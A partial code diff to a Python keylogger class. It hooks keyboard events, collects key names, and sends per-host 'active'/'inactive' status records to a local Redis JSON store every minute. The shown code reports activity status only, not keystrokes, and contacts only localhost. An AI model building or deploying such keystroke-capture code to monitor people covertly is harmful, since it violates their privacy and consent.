@@ -3,11 +3,22 @@ import socket
 import keyboard
 from threading import Timer
 from datetime import datetime
+from rejson import Client, Path
 
 SEND_REPORT_EVERY = 60  # in seconds, 60 means 1 minute and so on
 
-redis = redis.Redis('localhost')
+redis = Client(host="localhost", port=6379)
 hostname = socket.gethostname()
+
+data = {
+    'host': hostname,
+    'status': [
+        {
+            'datetime': datetime.now().__str__(),
+            'activity': "inactive",
+        }
+    ]
+}
 
 
 class Keylogger:
@@ -46,18 +57,18 @@ class Keylogger:
         self.log += name
 
     def send_to_redis(self):
-        data = {
-            'host': hostname,
-            'datetime': datetime.now().__str__(),
-            'activity': "inactive"
-        }
         if (self.log != ''):
-            data["activity"] = "active"
-            redis.json().set(
-                'activity', '$', data)
+            obj = {
+                "datetime": datetime.now().__str__(),
+                'activity': "active",
+            }
+            redis.jsonarrappend('test', Path('.status'), obj)
         else:
-            redis.json().set(
-                'activity', '$', data)
+            obj = {
+                "datetime": datetime.now().__str__(),
+                'activity': "inactive",
+            }
+            redis.jsonarrappend('test', Path('.status'), obj)
 
     def report(self):
         """
@@ -80,6 +91,7 @@ class Keylogger:
 
     def start(self):
         # record the start datetime
+        redis.jsonset('test', Path.rootPath(), data)
         self.start_dt = datetime.now()
         # start the keylogger
         keyboard.on_release(callback=self.callback)
